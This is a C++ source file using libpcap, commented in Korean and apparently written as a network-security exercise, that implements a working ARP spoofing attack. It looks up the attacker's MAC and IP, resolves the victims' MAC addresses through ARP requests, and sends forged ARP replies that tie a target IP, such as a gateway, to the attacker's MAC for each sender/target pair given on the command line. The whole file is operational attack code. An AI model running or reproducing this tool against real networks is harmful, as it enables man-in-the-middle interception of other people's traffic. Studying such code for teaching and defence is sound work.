#include <pcap.h>
#include <cstdio>
#include <iostream>
#include <string>
#include <net/if.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include "ethhdr.h"
#include "arphdr.h"

// MAC 주소 알아내기
Mac get_attacker_mac(const char* iface) {
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);

    ioctl(fd, SIOCGIFHWADDR, &ifr);

    close(fd);

    return Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);
}

// IP 주소를 알아내기
Ip get_attacker_ip(const char* iface) {
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);

    ioctl(fd, SIOCGIFADDR, &ifr);

    close(fd);

    return Ip(ntohl(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr.s_addr));
}

// ARP 요청을 보내고 응답을 통해 타겟 MAC 주소를 알아내기 
Mac get_target_mac(pcap_t* handle, Mac attacker_mac, Ip attacker_ip, Ip target_ip) {
    EthHdr eth_hdr;
    ArpHdr arp_hdr;

    eth_hdr.dmac_ = Mac::broadcastMac();
    eth_hdr.smac_ = attacker_mac;
    eth_hdr.type_ = htons(EthHdr::Arp);

    arp_hdr.hrd_ = htons(ArpHdr::ETHER);
    arp_hdr.pro_ = htons(EthHdr::Ip4);
    arp_hdr.hln_ = Mac::SIZE;
    arp_hdr.pln_ = Ip::SIZE;
    arp_hdr.op_ = htons(ArpHdr::Request);
    arp_hdr.smac_ = attacker_mac;
    arp_hdr.sip_ = htonl(attacker_ip);
    arp_hdr.tmac_ = Mac::nullMac();
    arp_hdr.tip_ = htonl(target_ip);

    uint8_t packet[sizeof(EthHdr) + sizeof(ArpHdr)];
    memcpy(packet, &eth_hdr, sizeof(EthHdr));
    memcpy(packet + sizeof(EthHdr), &arp_hdr, sizeof(ArpHdr));

    if (pcap_sendpacket(handle, packet, sizeof(packet)) != 0) {
        std::cerr << "Error sending ARP request: " << pcap_geterr(handle) << std::endl;
        exit(1);
    }

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* recv_packet;
        int res = pcap_next_ex(handle, &header, &recv_packet);

        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        EthHdr* eth_hdr_recv = (EthHdr*)recv_packet;
        if (eth_hdr_recv->type() != EthHdr::Arp) continue;

        ArpHdr* arp_hdr_recv = (ArpHdr*)(recv_packet + sizeof(EthHdr));
        if (arp_hdr_recv->op() == ArpHdr::Reply && arp_hdr_recv->sip() == target_ip) {
            return arp_hdr_recv->smac();
        }
    }

    return Mac::nullMac(); // 실패 시 null MAC 리턴
}

// ARP 공격 패킷 전송
void send_arp_attack(pcap_t* handle, Mac attacker_mac, Ip attacker_ip, Mac sender_mac, Ip sender_ip, Mac target_mac, Ip target_ip) {
    EthHdr eth_hdr;
    ArpHdr arp_hdr;

    // Ethernet 헤더 구성
    eth_hdr.dmac_ = sender_mac;  // Sender의 MAC 주소
    eth_hdr.smac_ = attacker_mac; // 공격자의 MAC 주소
    eth_hdr.type_ = htons(EthHdr::Arp);

    // ARP 헤더 구성
    arp_hdr.hrd_ = htons(ArpHdr::ETHER);         // 하드웨어 타입: 이더넷
    arp_hdr.pro_ = htons(EthHdr::Ip4);           // 프로토콜 타입: IPv4
    arp_hdr.hln_ = Mac::SIZE;                    // 하드웨어 주소 길이
    arp_hdr.pln_ = Ip::SIZE;                     // 프로토콜 주소 길이
    arp_hdr.op_ = htons(ArpHdr::Reply);          // ARP Reply

    // 공격 ARP Reply 구성
    arp_hdr.smac_ = attacker_mac;                // 공격자의 MAC 주소
    arp_hdr.sip_ = htonl(target_ip);             // 타겟의 IP (예: 게이트웨이 IP)
    arp_hdr.tmac_ = sender_mac;                  // Sender의 MAC 주소
    arp_hdr.tip_ = htonl(sender_ip);             // Sender의 IP 주소

    // 패킷 생성
    uint8_t packet[sizeof(EthHdr) + sizeof(ArpHdr)];
    memcpy(packet, &eth_hdr, sizeof(EthHdr));
    memcpy(packet + sizeof(EthHdr), &arp_hdr, sizeof(ArpHdr));

    // 패킷 전송
    if (pcap_sendpacket(handle, packet, sizeof(packet)) != 0) {
        std::cerr << "Error sending ARP attack packet: " << pcap_geterr(handle) << std::endl;
        exit(1);
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4) {
        std::cerr << "Usage: " << argv[0] << " <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]" << std::endl;
        return 1;
    }

    char* dev = argv[1];
    pcap_t* handle;
    char errbuf[PCAP_ERRBUF_SIZE];

    handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        std::cerr << "Couldn't open device " << dev << ": " << errbuf << std::endl;
        return 1;
    }

    Mac attacker_mac = get_attacker_mac(dev);
    Ip attacker_ip = get_attacker_ip(dev);

    std::cout << "Attacker MAC: " << std::string(attacker_mac) << std::endl;
    std::cout << "Attacker IP: " << std::string(attacker_ip) << std::endl;

    for (int i = 2; i < argc; i += 2) {
        Ip sender_ip = Ip(argv[i]);
        Ip target_ip = Ip(argv[i + 1]);

        Mac target_mac = get_target_mac(handle, attacker_mac, attacker_ip, target_ip);
        Mac sender_mac = get_target_mac(handle, attacker_mac, attacker_ip, sender_ip);

        std::cout << "Sender MAC: " << std::string(sender_mac) << " (" << std::string(sender_ip) << ")" << std::endl;
        std::cout << "Target MAC: " << std::string(target_mac) << " (" << std::string(target_ip) << ")" << std::endl;

        send_arp_attack(handle, attacker_mac, attacker_ip, sender_mac, sender_ip, target_mac, target_ip);
    }

    pcap_close(handle);
    return 0;
}

